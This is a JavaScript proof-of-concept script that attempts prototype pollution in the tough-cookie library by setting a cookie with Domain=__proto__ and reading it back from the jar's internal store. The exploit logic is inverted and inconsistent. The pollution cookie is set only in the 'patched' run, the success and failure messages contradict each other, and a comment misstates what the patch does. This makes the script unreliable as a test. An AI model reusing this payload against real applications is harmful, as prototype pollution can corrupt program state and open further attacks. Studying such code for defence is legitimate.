async function main(vulnerable) {

    // Initialize exploitCookie to null
    let exploitCookie = null;

    try {
        console.log(`Creating a new cookie jar for ${vulnerable ? 'vulnerable' : 'patched'} version...`);
        var tough = require("tough-cookie");
        var cookiejar = new tough.CookieJar(undefined, { rejectPublicSuffixes: !vulnerable });

        console.log("Setting a normal cookie...");
        await new Promise((resolve, reject) => {
            cookiejar.setCookie(
                "Auth=Lol; Domain=google.com; Path=/auth",
                "https://google.com/",
                { loose: true },
                (err, cookie) => {
                    if (err) {
                        reject(err);
                    } else {
                        resolve(cookie);
                    }
                }
            );
        });
      

        // attempts to set an exploit cookie if the version is not vulnerable (!vulnerable).
        if (!vulnerable) {
            console.log("Setting an exploit cookie...");
            await new Promise((resolve, reject) => {
                cookiejar.setCookie(
                    "Slonser=polluted; Domain=__proto__; Path=/exploit",
                    "https://__proto__/admin",
                    { loose: true },
                    (err, cookie) => {
                        if (err) {
                            reject(err);
                        } else {
                            resolve(cookie);
                        }
                    }
                );
            });
        }

        console.log("Trying to access the exploit cookie...");
        // Access the exploit cookie here
        exploitCookie = cookiejar.store.idx["__proto__"]["/exploit"]["Slonser"];

        if (exploitCookie) {
            if (vulnerable) {
                console.log(`EXPLOIT SUCCEEDED`);
            } else {
                console.log(`EXPLOIT FAILED`);
            }
        } else {
            if (vulnerable) {
                console.log(`EXPLOIT FAILED`);
            } else {
                console.log(`EXPLOIT SUCCEEDED`);
            }
        }
    } catch (error) {
        /*
        This error occurred because the patched version correctly prevented the prototype pollution vulnerability by rejecting cookies with a domain set to a public suffix. As a result, the exploit cookie with the domain "proto" was rejected, leading to the error.
        */
        //console.error("Error:", error);
        console.log(`EXPLOIT ${vulnerable ? 'FAILED' : 'SUCCEEDED'}`);
    }
}

// Check if the vulnerable version works
console.log("Testing vulnerable version...");
main(true);

// Check if the patched version works
console.log("\nTesting patched version...");
main(false);
